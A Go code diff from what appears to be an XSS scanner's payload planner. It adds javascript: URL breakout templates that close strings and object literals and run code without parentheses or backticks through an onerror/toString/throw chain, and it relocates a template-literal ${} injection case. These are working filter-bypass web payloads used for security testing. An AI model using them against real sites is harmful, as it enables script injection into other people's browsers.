@@ -45,7 +45,14 @@ const (
 const (
 	TriggerLoad        = "load"
 	TriggerInteraction = "interaction"
-	TriggerNone        = "none"
+	// TriggerJSURL is a javascript: URL in the page's OWN markup whose body
+	// carries the injection. It executes when the element carrying it is
+	// clicked — the browser percent-decodes the URL before evaluating it, so a
+	// reader's URL-encoding of the payload is not a defence. Distinct from
+	// TriggerInteraction because the activation needs no handler in the value:
+	// the element that already exists (an <a href="javascript:…">) is clicked.
+	TriggerJSURL = "jsurl"
+	TriggerNone  = "none"
 )
 
 // Candidate sources.
@@ -487,6 +494,9 @@ func templatesFor(a ContextAnalysis, m string) []candTemplate {
 func onLoad(value, needs string, priority int, why string) candTemplate {
 	return candTemplate{value: value, needs: needs, priority: priority, rationale: why, trigger: TriggerLoad}
 }
+func onJSURL(value, needs string, priority int, why string) candTemplate {
+	return candTemplate{value: value, needs: needs, priority: priority, rationale: why, trigger: TriggerJSURL}
+}
 func onInteraction(value, needs string, priority int, why string) candTemplate {
 	return candTemplate{value: value, needs: needs, priority: priority, rationale: why, trigger: TriggerInteraction}
 }
@@ -758,6 +768,42 @@ func delimiterNote(rationale, q string) string {
 
 func jsTemplates(a ContextAnalysis, m string) []candTemplate {
 	switch {
+	case a.Context == CtxJSString && (a.Attribute == "href" || a.Attribute == "src" || a.Attribute == "action"):
+		// A JS string inside href/src/action can only be a javascript: URL, and
+		// that URL executes when the element is clicked (the browser
+		// percent-decodes it first, so a reader encoding the payload does not
+		// neutralise it — measured: %27 in the served href becomes a working
+		// quote at click time).
+		//
+		// The sink's argument positions decide the shape. Inside a call's
+		// object literal a ';' is a syntax error — the string must be closed
+		// together with the object ('}), the payload must then stay inside the
+		// argument list, and the tail must be absorbed (the trailing {x:').
+		// Execution itself cannot use parentheses (this lab filters them) or
+		// backticks (also filtered), so the throw/onerror/toString chain is the
+		// route: an arrow function body holds the throw statement, window's
+		// toString is replaced so forcing a string conversion calls it, and
+		// onerror carries the marker to alert.
+		return []candTemplate{
+			onJSURL(`'},x=x=>{onerror=alert;`+m+`},toString=x,window+'',{x:'`, `'`, 92,
+				"close the single-quoted string and the object literal ('}), stay inside the call's argument list, and execute without parentheses, backticks or spaces: an arrow function assigned to x holds the throw statement, window.toString is replaced so forcing a string conversion calls it, and onerror=alert is installed before the marker is evaluated as a bare statement (so the runtime observer can attribute the ReferenceError to it); the trailing {x:' absorbs the argument list's own closing syntax so the whole javascript: URL stays parseable"),
+			onJSURL(`"},x=x=>{onerror=alert;`+m+`},toString=x,window+"",{x:"`, `"`, 90,
+				"the double-quoted equivalent of the object-literal javascript: URL breakout: close the string and object, keep the payload inside the argument list, execute via throw/onerror/toString without parentheses or backticks, and absorb the tail with {x:"),
+		}
+	case a.Context == CtxJSString && a.Sub == "template_literal":
+		// Substitution is the one shape a template literal cannot take away
+		// from us: it executes without needing any quote, angle bracket or
+		// backtick, so it is the only route when the reader escapes those
+		// characters — the literal cannot then be closed, and the script
+		// element cannot be ended either. It does depend on the server
+		// leaving '$', '{' and '}' unescaped, which the probe canary
+		// (<>"') cannot observe, so the planner neither claims nor denies
+		// that they survive: it plans the shape at full priority and sends
+		// it regardless. A reader that escapes those characters too (or
+		// escapes the whole opener) keeps it inert text, and the attempt is
+		// then recorded as reflected-but-not-executed.
+		return []candTemplate{onLoad("${"+m+"}", "", 85,
+			"interpolate the marker as ${MARKER}: substitution executes inside the template literal without needing any quote, angle bracket or backtick, so it is the only route when the reader escapes those characters (the literal cannot then be closed and the script element cannot be ended); it depends on the server leaving '$', '{' and '}' unescaped, which the probe canary cannot observe, so it is planned at full priority regardless")}
 	case a.Context == CtxJSString && a.Sub == "single_quoted":
 		return []candTemplate{
 			onLoad("';"+m+"//", "'", 90, "close the single-quoted JS string and start a statement that references the marker"),
@@ -786,20 +832,6 @@ func jsTemplates(a ContextAnalysis, m string) []candTemplate {
 		}
 	case a.Context == CtxJSString && a.Sub == "double_quoted":
 		return []candTemplate{onLoad(`";`+m+"//", `"`, 90, "close the double-quoted JS string and start a statement that references the marker")}
-	case a.Context == CtxJSString && a.Sub == "template_literal":
-		// Substitution is the one shape a template literal cannot take away
-		// from us: it executes without needing any quote, angle bracket or
-		// backtick, so it is the only route when the reader escapes those
-		// characters — the literal cannot then be closed, and the script
-		// element cannot be ended either. It does depend on the server
-		// leaving '$', '{' and '}' unescaped, which the probe canary
-		// (<>"') cannot observe, so the planner neither claims nor denies
-		// that they survive: it plans the shape at full priority and sends
-		// it regardless. A reader that escapes those characters too (or
-		// escapes the whole opener) keeps it inert text, and the attempt is
-		// then recorded as reflected-but-not-executed.
-		return []candTemplate{onLoad("${"+m+"}", "", 85,
-			"interpolate the marker as ${MARKER}: substitution executes inside the template literal without needing any quote, angle bracket or backtick, so it is the only route when the reader escapes those characters (the literal cannot then be closed and the script element cannot be ended); it depends on the server leaving '$', '{' and '}' unescaped, which the probe canary cannot observe, so it is planned at full priority regardless")}
 	case a.Context == CtxJSComment:
 		// Escaping a comment needs a newline (line) or the close sequence (block).
 		if a.Sub == "block" {
